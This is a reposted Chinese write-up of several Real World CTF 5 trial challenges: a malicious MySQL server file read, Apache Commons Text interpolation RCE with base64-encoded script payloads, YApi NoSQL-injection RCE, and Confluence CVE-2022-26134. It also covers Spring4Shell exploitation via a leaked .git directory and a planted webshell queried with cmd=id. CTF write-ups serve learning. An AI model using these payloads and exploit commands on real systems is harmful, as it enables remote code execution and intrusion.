---
title: 第五届 RealWorld CTF 体验赛部分解题复盘
url: https://buaq.net/go-148026.html
source: unSafe.sh - 不安全
date: 2023-02-06
fetch_date: 2025-10-04T05:47:04.830490
---

# 第五届 RealWorld CTF 体验赛部分解题复盘

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/539991da8655b05de829c4779998cd07.jpg)

第五届 RealWorld CTF 体验赛部分解题复盘

Evil MySQL Server题目分析思考:这题是mysql 连接到恶意服务器时，恶意服务端可以读取 mysql 客户端本地文件的特性进行利用比赛的时候借助
*2023-2-5 18:2:34
Author: [xz.aliyun.com(查看原文)](/jump-148026.htm)
阅读量:35
收藏*

---

**Evil MySQL Server**

用它在你自己的公网 vps 服务器上启动一个恶意的 mysql server，地址是公网的VPS，端口3306，然后打开题目，在表单里填上对应的服务器地址，用户名处填 fileread\_/flag，提交。mysql fake server 就会收到请求，并读到 /flag 文件内容。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230205172203-8d3d4afc-a536-1.jpg)

public class CommonsPoc {
public static void main(String[] args) {
StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
// 命令执行
// String poc = interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\")}");
// SSRF
// String poc = interpolator.replace("${url:utf-8:<http://123.d2kohg.dnslog.cn}>");
// 命令执行base64编码绕过
String poc = interpolator.replace("${base64Decoder:JHtzY3JpcHQ6anM6amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIm9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAiKX0=}");

POC:
${base64decoder:JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}

base64解密就是:
${script:JavaScript:var a=java.lang.Runtime.getRuntime().exec("/readflag");var b=a.getInputStream();var c=new java.io.BufferedReader(new java.io.InputStreamReader(b));c.readLine();}
![](https://xzfile.aliyuncs.com/media/upload/picture/20230205173016-b2e9688e-a537-1.png)
获得flag

**Yummy Api**
这题是YApi < 1.12.0 NoSQL 注入 RCE
这题是 Yapi 通过页面信息我们可以得到当前 Yapi 的版本为 v1.10.2。在这个版本中我们可以进行如下操作最终实现 RCE，获取 Flag
利用的POC脚本:
<https://raw.githubusercontent.com/vulhub/vulhub/e186e1817786817b484f4f196510478c57ac7ee3/yapi/mongodb-inj/poc.py>
python3 poc.py --debug one4all -u <http://ip:9090/> -c "/readflag"
获得flag

**Be-a-Wiki-Hacker**
做题的时候发现版本 7.13.6，搜索 Confluence 历史漏洞，可以发现 CVE-2022-26134 这个表达式注入漏洞是可以利用的
POC利用:
<https://github.com/crowsec-edtech/CVE-2022-26134/>

**Spring4Shell**
在做题的时候,发现是.git泄露
python3 git\_extract.py <http://47.98.216.107:31584/.git/>
我们可以根据appBase=""确定项目的路径
cat 47.98.216.107\_31584/server.xml | grep appBase
得到:Host name="XXXX" appBase="chaitin"
在根据CVE-2022-22965进行EXP利用
Spring4shell EXP：
<https://github.com/reznok/Spring4Shell-POC>.
需要手动指定web的路径
python3 exploit.py --url <http://47.98.216.107:31584/> --dir chaitin/ROOT
webshell 写入路径：/tmp/shellcode.jsp
访问 webshell：
<http://47.98.216.107:31584/tmp/shellcode.jsp?cmd=id>
最后读取 flag即可

**总结:**
这次第五届RealWorldCTF体验赛收获还是很多的,比赛的题目更多的是CVE的漏洞的关注和利用,不愧是"真实世界"!

文章来源: https://xz.aliyun.com/t/12113
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)